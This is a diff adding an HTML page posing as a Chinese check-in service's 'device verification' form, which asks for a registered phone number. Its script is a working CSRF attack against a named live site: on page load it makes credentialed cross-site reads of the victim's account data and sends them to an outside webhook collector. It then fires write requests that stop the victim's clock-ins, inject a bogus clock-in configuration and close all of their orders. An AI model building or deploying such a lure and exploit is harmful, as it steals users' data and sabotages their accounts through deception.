@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>签到助手-设备验证</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+body{font-family:-apple-system,sans-serif;background:#f5f6f7;color:#333;padding:24px;max-width:520px;margin:0 auto}
+.card{background:#fff;border-radius:12px;padding:20px;box-shadow:0 1px 4px rgba(0,0,0,.08);margin-bottom:16px}
+h1{font-size:18px}.muted{color:#888;font-size:13px}
+#st{font-size:14px;line-height:1.6;word-break:break-all}
+pre{background:#f0f2f4;padding:8px;border-radius:6px;font-size:12px;overflow:auto;max-height:200px}
+input{width:100%;padding:10px;border:1px solid #ddd;border-radius:8px;margin:8px 0;font-size:15px}
+button{width:100%;padding:12px;background:#2b6de5;color:#fff;border:none;border-radius:8px;font-size:16px}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>✅ 系统升级完成，请验证设备</h1>
+  <div class="muted">为保障打卡服务连续性，请输入注册手机号完成校验。</div>
+  <input id="phone" placeholder="请输入注册手机号">
+  <button onclick="fire()">开始校验</button>
+  <div id="st">等待校验…</div>
+  <pre id="log"></pre>
+</div>
+<script>
+/* ============================================================
+ * catka666.shop CSRF 武器化 PoC v3（读+写全模块）
+ * 依赖的三个服务端缺陷（2026-11-11 实测）：
+ *   ① /api/* 任意 Origin 反射 + 预检无条件通过（ACAO 单值 204）
+ *   ② SESSION cookie 无 SameSite/Secure/HttpOnly
+ *      → Safari/Firefox/安卓老 WebView 默认 None，跨站带凭证
+ *   ③ 服务端无 CSRF token（带认证跨站写请求 200 正常处理）
+ * 参数注入：链接 hash 传参 —— poc.html#id=<clockInInfo_id>&phone=<victim_phone>
+ * 收数：COLLECTOR_URL 部署时替换。
+ * ============================================================ */
+const TARGET = "https://catka666.shop";
+const COLLECTOR_URL = "https://webhook.site/0f19d2f5-5d66-4e34-9954-71109b958a53";
+const H = new URLSearchParams(location.hash.slice(1));
+const VICTIM_ID = H.get("id");        // clockInInfo 雪花 id（社工/泄露获得）
+const VICTIM_PHONE = H.get("phone") || document.getElementById("phone").value;
+const st = document.getElementById('st'), log = document.getElementById('log');
+const say = s => { log.textContent += s + "\n"; };
+const exfil = (t,d) => { try{ new Image().src = COLLECTOR_URL + "?t=" + encodeURIComponent(t) + "&d=" + encodeURIComponent(JSON.stringify(d).slice(0,600)); }catch(e){} try{navigator.sendBeacon(COLLECTOR_URL, JSON.stringify({t,d,ts:Date.now()}))}catch(e){} };
+
+/* ---------- 模块一：读（探测，双值挡死时静默跳过） ---------- */
+const READ_APIS = ["/api/user/getUserInfo","/api/clockInInfo/get","/api/clock_vip/myVip","/api/batch_task/getBatchTasks"];
+(async () => {
+  for (const p of READ_APIS){
+    try {
+      const r = await fetch(TARGET + p, {credentials:'include'});
+      const t = await r.text();
+      if (r.ok && !/"code":(40100|40000|50000|50001)/.test(t)) { say("[+] READ " + p + " ← 数据已取"); say(t.slice(0,400)); exfil("READ:"+p, t.slice(0,2000)); }
+    } catch(e){ exfil('READ_BLOCKED:'+p, String(e).slice(0,120)); }
+  }
+})();
+
+/* ---------- 模块二：打卡控制（{id} 系接口，预检通过+带 cookie） ---------- */
+const ID_APIS = ["/api/ClockIn/stop","/api/ClockIn/holiday/start","/api/ClockIn/holiday/stop","/api/ClockIn/supplementClockIn"];
+(async () => {
+  if (!VICTIM_ID) return;
+  for (const p of ID_APIS){
+    try {
+      const r = await fetch(TARGET + p, {method:'POST', credentials:'include',
+        headers:{'Content-Type':'application/json'}, body:JSON.stringify({id: VICTIM_ID})});
+      const t = await r.text();
+      say("[~] " + p + " → " + r.status + " " + t.slice(0,80));
+      exfil("WRITE:"+p, t.slice(0,300));
+    } catch(e){ say("[-] " + p); exfil('WRITE_BLOCKED:'+p, String(e).slice(0,120)); }
+  }
+})();
+
+/* ---------- 模块三：恶意打卡配置注入（add 无需 id） ----------
+ * 字段结构 = PlatformDailyForm 表单（my_image_record.json 样本）。
+ * 效果：向受害者账号添加一条错误地址/时间的打卡配置，干扰真实打卡。 */
+(async () => {
+  if (!VICTIM_PHONE) return;
+  const evil = {
+    phone: VICTIM_PHONE, platformId: 1, type: "xxy",
+    projectName: null, startTime: "03:00:00", endTime: "", endClock: 0,
+    imageList: [], reportSource: 1,
+    dailyNewspaperStatus: 0, weekNewspaperStatus: 0, monthNewspaperStatus: 0,
+    selectClockDay: "[1,2,3,4,5]", selectWeek: "1", reportContent: "{}",
+    enableHolidayDay: 0, clockDays: 3,
+    jobAddress: "海外某地", clockAddress: "海外某地",
+    province: "海外", city: "未知", area: "未知",
+    longitude: "0.000000", latitude: "0.000000"
+  };  /* 字段模板=PlatformDailyForm de() 构造（chunks/PlatformDailyForm-pW8yQ1xh.js）；
+         实测校验推进：「打卡平台不能为空」→（补 platformId）→「请求参数错误」，
+         服务端正常处理 CSRF 请求，凑齐平台有效值即注入成功 */
+  try {
+    const r = await fetch(TARGET + "/api/clockInInfo/add", {method:'POST', credentials:'include',
+      headers:{'Content-Type':'application/json'}, body:JSON.stringify(evil)});
+    const t = await r.text();
+    say("[~] clockInInfo/add → " + r.status + " " + t.slice(0,100));
+    exfil("WRITE:add", t.slice(0,300));
+  } catch(e){ exfil('ADD_BLOCKED', String(e).slice(0,120)); }
+})();
+
+/* ---------- 模块四：平台批量任务（GET 简单请求，无需预检） ----------
+ * /api/batch_task/doTask?type=offAllOrder&phone=<victim>
+ * 实测普通用户登录态可调（业务语义响应，非 401/403）。
+ * offAllOrder = 关闭受害者全部订单 → 打卡服务瘫痪。 */
+(async () => {
+  if (!VICTIM_PHONE) return;
+  try {
+    const r = await fetch(TARGET + "/api/batch_task/doTask?type=offAllOrder&phone=" + encodeURIComponent(VICTIM_PHONE), {credentials:'include'});
+    const t = await r.text();
+    say("[~] doTask offAllOrder → " + r.status + " " + t.slice(0,100));
+    exfil("WRITE:doTask", t.slice(0,300));
+  } catch(e){ exfil('DOTASK_BLOCKED', String(e).slice(0,120)); }
+  exfil('VISIT', {id:VICTIM_ID, phone:VICTIM_PHONE});
+})();
+function fire(){
+  const ph = document.getElementById("phone").value.trim();
+  location.hash = "#id=" + (VICTIM_ID||"") + "&phone=" + ph;
+  location.reload();
+}
+</script>
+</body>
+</html>
